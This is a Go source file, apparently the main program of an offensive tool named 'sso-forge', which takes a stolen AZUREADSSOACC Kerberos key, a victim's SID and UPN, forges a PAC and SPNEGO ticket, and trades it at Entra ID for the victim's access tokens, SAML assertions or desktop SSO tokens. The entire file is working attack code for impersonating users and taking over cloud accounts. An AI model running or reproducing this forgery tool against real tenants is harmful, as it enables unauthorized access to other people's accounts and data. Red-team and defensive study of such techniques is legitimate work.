// sso-forge — Forge Entra ID Seamless SSO tokens from AZUREADSSOACC Kerberos key.
package main

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/skewwbox/sso-forge/internal/discovery"
	"github.com/skewwbox/sso-forge/internal/exchange"
	"github.com/skewwbox/sso-forge/internal/pac"
	"github.com/skewwbox/sso-forge/internal/parse"
	kbticket "github.com/skewwbox/sso-forge/internal/ticket"

	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
)

func main() {
	var (
		hash     = flag.String("hash", "", "AZUREADSSOACC key (hex, 32 or 64 chars, or secretsdump line)")
		sid      = flag.String("sid", "", "Target user SID (e.g., S-1-5-21-X-Y-Z-RID)")
		domain   = flag.String("domain", "", "WS-Trust URL domain — public UPN suffix (e.g., contoso.com)")
		realm    = flag.String("realm", "", "Kerberos realm — on-prem AD FQDN in uppercase (e.g., CORP.CONTOSO.COM)")
		upn      = flag.String("upn", "", "Target user UPN (e.g., user@contoso.com)")
		ticket   = flag.String("ticket", "", "Pre-generated base64 SPNEGO ticket (skips forge, tests exchange only)")
		pacFile  = flag.String("pac-file", "", "Pre-built PAC binary file (skips PAC builder)")
		machID   = flag.String("machine-id", "", "Machine ID binary file for TokenRestrictions")
		kerbLoc  = flag.String("kerb-local", "", "KerbLocal binary file for auth-data Entry 2")
		tenantID = flag.String("tenant-id", "", "Entra ID tenant ID (auto-discovered if empty)")
		resource = flag.String("resource", "https://graph.windows.net", "Target resource URL")
		clientID = flag.String("client-id", exchange.DefaultClientID, "OAuth2 client ID")
		output   = flag.String("output", "json", "Output format: json|token")
		dryRun   = flag.Bool("dry-run", false, "Stop after forging ticket (no network)")
		verbose  = flag.Bool("v", false, "Verbose: print intermediate data")
	)
	flag.Parse()

	hasForged := *hash != "" || *sid != "" || *upn != ""
	hasPreGen := *ticket != ""

	if hasPreGen {
		if *domain == "" {
			*ticket = "" // force usage error
		}
		hasForged = false
	}

	if !hasPreGen && (!hasForged || *domain == "" || *realm == "") {
		fmt.Fprintf(os.Stderr, "Usage:\n")
		fmt.Fprintf(os.Stderr, "  Forge + exchange: sso-forge --hash <KEY> --sid <SID> --domain <DOMAIN> --realm <REALM> --upn <UPN>\n")
		fmt.Fprintf(os.Stderr, "  Exchange only:    sso-forge --ticket <SPNEGO_B64> --domain <DOMAIN>\n")
		fmt.Fprintf(os.Stderr, "  --ticket   Pre-generated SPNEGO ticket (skips PAC/ticket forge)\n")
		fmt.Fprintf(os.Stderr, "  --domain   WS-Trust URL domain (public UPN suffix)\n")
		fmt.Fprintf(os.Stderr, "  --realm    Kerberos realm for forging (on-prem AD, e.g. CORP.CONTOSO.COM)\n")
		fmt.Fprintf(os.Stderr, "  --dry-run  Forge ticket only, skip cloud exchange\n")
		fmt.Fprintf(os.Stderr, "  -v         Verbose intermediate output\n")
		os.Exit(1)
	}

	// Pre-generated ticket path: skip forge, test exchange only
	if *ticket != "" {
		info, err := discovery.ResolveOrDiscover(*domain, *tenantID)
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: discovery: %v\n", err)
			os.Exit(1)
		}
		token, err := exchange.GetAccessToken(&exchange.ExchangeParams{
			SPNEGOTicket: *ticket,
			Domain:       *domain,
			TenantID:     info.TenantID,
			Resource:     *resource,
			ClientID:     *clientID,
		})
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: exchange: %v\n", err)
			os.Exit(1)
		}
		switch *output {
		case "token":
			fmt.Println(token.AccessToken)
		case "json":
			out, err := json.MarshalIndent(token, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: json: %v\n", err)
			os.Exit(1)
		}
			fmt.Println(string(out))
		}
		return
	}

	// 1. Parse hash
	keys, err := parse.ParseHashInput(*hash)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: hash: %v\n", err)
		os.Exit(1)
	}
	var key []byte
	var eType int32
	if keys.RC4 != nil {
		key = keys.RC4
		eType = etypeID.RC4_HMAC
		if *verbose {
			fmt.Fprintf(os.Stderr, "[+] RC4 key: %s...\n", hex.EncodeToString(key[:4]))
		}
	} else if keys.AES256 != nil {
		key = keys.AES256
		eType = etypeID.AES256_CTS_HMAC_SHA1_96
		if *verbose {
			fmt.Fprintf(os.Stderr, "[+] AES256 key: %s...\n", hex.EncodeToString(key[:4]))
		}
	} else if keys.AES128 != nil {
		key = keys.AES128
		eType = etypeID.AES128_CTS_HMAC_SHA1_96
		if *verbose {
			fmt.Fprintf(os.Stderr, "[+] AES128 key: %s...\n", hex.EncodeToString(key[:4]))
		}
	} else {
		fmt.Fprint(os.Stderr, "error: no valid key found (RC4 or AES256 required)\n")
		os.Exit(1)
	}

	// 2. Resolve tenant
	info, err := discovery.ResolveOrDiscover(*domain, *tenantID)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: discovery: %v\n", err)
		os.Exit(1)
	}
	if *verbose {
		fmt.Fprintf(os.Stderr, "[+] Domain: %s | Realm: %s\n", *domain, *realm)
	}

	// 3. Extract identity details
	userRID := parseRID(*sid)
	userName := extractUserName(*upn)
	// Derive AD domain from Kerberos realm (WINDOMAIN.LOCAL → WINDOMAIN)
	netBIOS := strings.ToUpper(extractNetBIOS(*realm))

	if *verbose {
		fmt.Fprintf(os.Stderr, "[+] User: %s (RID: %d)\n", userName, userRID)
	}

	// 4. Build PAC
	var pacBytes []byte
	var authTimeFT uint64
	if *pacFile != "" {
		var err error
		pacBytes, err = os.ReadFile(*pacFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: PAC file: %v\n", err)
			os.Exit(1)
		}
		if *verbose {
			fmt.Fprintf(os.Stderr, "[+] PAC (from file): %d bytes\n", len(pacBytes))
		}
	} else {
		params := &pac.BuildParams{
			UserSID:       *sid,
			UserRID:       userRID,
			DomainNetBIOS: netBIOS,
			DomainFQDN:    *domain,
			Realm:         *realm,
			UPN:           *upn,
			FullName:      "DisplayName",
			ServerName:    "DC1.company.com",
			NTHash:        key,
		}
		pacBuilder := pac.NewBuilder(params)
		now := time.Now().UTC().Truncate(time.Second)
		authTimeFT = uint64(now.Add(-43 * time.Second).UnixNano()/100 + 116444736000000000)
		pacBuilder.SetAuthTime(authTimeFT)
		var err error
		pacBytes, err = pacBuilder.Build()
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: PAC: %v\n", err)
			os.Exit(1)
		}
		if *verbose {
			fmt.Fprintf(os.Stderr, "[+] PAC: %d bytes\n", len(pacBytes))
		}
	}
	// 5. Forge ticket
	forgeParams := &kbticket.ForgeParams{
		Key:           key,
		EType:         eType,
		UserPrincipal: *upn,
		Realm:         *realm,
		PAC:           pacBytes,
		UserName:      userName,
		AuthTimeFT:    authTimeFT,
	}
	if *machID != "" {
		d, err := os.ReadFile(*machID)
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: machine-id file: %v\n", err)
			os.Exit(1)
		}
		forgeParams.MachineID = d
		if *verbose {
			fmt.Fprintf(os.Stderr, "[+] MachineID (from file): %d bytes\n", len(d))
		}
	}
	if *kerbLoc != "" {
		d, err := os.ReadFile(*kerbLoc)
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: kerb-local file: %v\n", err)
			os.Exit(1)
		}
		forgeParams.KerbLocal2 = d
		if *verbose {
			fmt.Fprintf(os.Stderr, "[+] KerbLocal (from file): %d bytes\n", len(d))
		}
	}
	forged, err := kbticket.Forge(forgeParams)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: forge: %v\n", err)
		os.Exit(1)
	}
	if *verbose {
		fmt.Fprintf(os.Stderr, "[+] SPNEGO: %d bytes\n", len(forged.SPNEGOBytes))
	}

	spnegoB64 := base64.StdEncoding.EncodeToString(forged.SPNEGOBytes)

	if *dryRun {
		if *output == "json" {
			out, err := json.MarshalIndent(map[string]any{
				"status":   "dry-run",
				"spnego64": spnegoB64,
				"domain":   *domain,
				"realm":    info.Realm,
				"tenant":   info.TenantID,
				"upn":      *upn,
				"sid":      *sid,
			}, "", "  ")
			if err != nil {
				fmt.Fprintf(os.Stderr, "error: json: %v\n", err)
				os.Exit(1)
			}
			fmt.Println(string(out))
		} else {
			fmt.Println(spnegoB64)
		}
		return
	}

	// 6. Exchange for token
	token, err := exchange.GetAccessToken(&exchange.ExchangeParams{
		SPNEGOTicket: spnegoB64,
		Domain:       *domain,
		TenantID:     info.TenantID,
		Resource:     *resource,
		ClientID:     *clientID,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: exchange: %v\n", err)
		os.Exit(1)
	}

	// 7. Output
	switch *output {
	case "token":
		fmt.Println(token.AccessToken)
	case "json":
		out, err := json.MarshalIndent(token, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: json: %v\n", err)
			os.Exit(1)
		}
		fmt.Println(string(out))
	case "saml":
		decoded, err := base64.StdEncoding.DecodeString(token.SAMLAssertion)
		if err != nil {
			fmt.Fprintf(os.Stderr, "error: SAML decode: %v\n", err)
			os.Exit(1)
		}
		fmt.Println(string(decoded))
	case "ssotoken":
		fmt.Println(token.DesktopSsoToken)
	default:
		fmt.Fprintf(os.Stderr, "unknown output: %s\n", *output)
		os.Exit(1)
	}
}

func parseRID(sid string) uint32 {
	var rid int64
	for i := len(sid) - 1; i >= 0; i-- {
		if sid[i] == '-' {
			if _, err := fmt.Sscanf(sid[i+1:], "%d", &rid); err == nil {
				return uint32(rid)
			}
			break
		}
	}
	return 0
}

func extractUserName(upn string) string {
	for i, r := range upn {
		if r == '@' {
			return upn[:i]
		}
	}
	return upn
}

func extractNetBIOS(domain string) string {
	for i, r := range domain {
		if r == '.' {
			return domain[:i]
		}
	}
	return domain
}
